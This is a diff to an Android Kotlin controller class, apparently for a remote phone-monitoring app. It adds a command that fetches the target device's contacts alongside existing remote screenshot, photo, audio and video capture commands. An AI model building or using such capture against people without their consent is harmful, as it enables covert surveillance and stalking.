@@ -86,6 +86,9 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     private val _audioRecords = MutableStateFlow<List<MediaItem>>(emptyList())
     val audioRecords: StateFlow<List<MediaItem>> = _audioRecords.asStateFlow()
 
+    private val _contacts = MutableStateFlow<List<Contact>>(emptyList())
+    val contacts: StateFlow<List<Contact>> = _contacts.asStateFlow()
+
     private val _commandResponse = MutableStateFlow<Pair<String, String>?>(null)
     val commandResponse: StateFlow<Pair<String, String>?> = _commandResponse.asStateFlow()
 
@@ -352,6 +355,9 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         if (streamPollingJob?.isActive != true) {
             _liveStreamState.value = connector.getLiveStreamState(token)
         }
+
+        // 11. Fetch Contacts
+        _contacts.value = connector.getContacts(token)
     }
 
     private fun checkForNewAlert(alerts: List<SecurityAlert>) {
@@ -401,6 +407,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             "take_screenshot" -> "التقاط لقطة شاشة"
             "take_photo" -> "التقاط صورة كاميرا"
             "record_audio" -> "تسجيل صوتي"
+            "get_contacts" -> "جلب جهات الاتصال"
             "record_video_front" -> "تسجيل فيديو (أمامي)"
             "record_video_back" -> "تسجيل فيديو (خلفي)"
             "list_apps" -> "جلب قائمة التطبيقات"
@@ -620,6 +627,10 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
 
     fun requestAudioRecord() {
         runCommand("record_audio")
+    }
+
+    fun requestContacts() {
+        runCommand("get_contacts")
     }
 
     fun requestAppsList() {
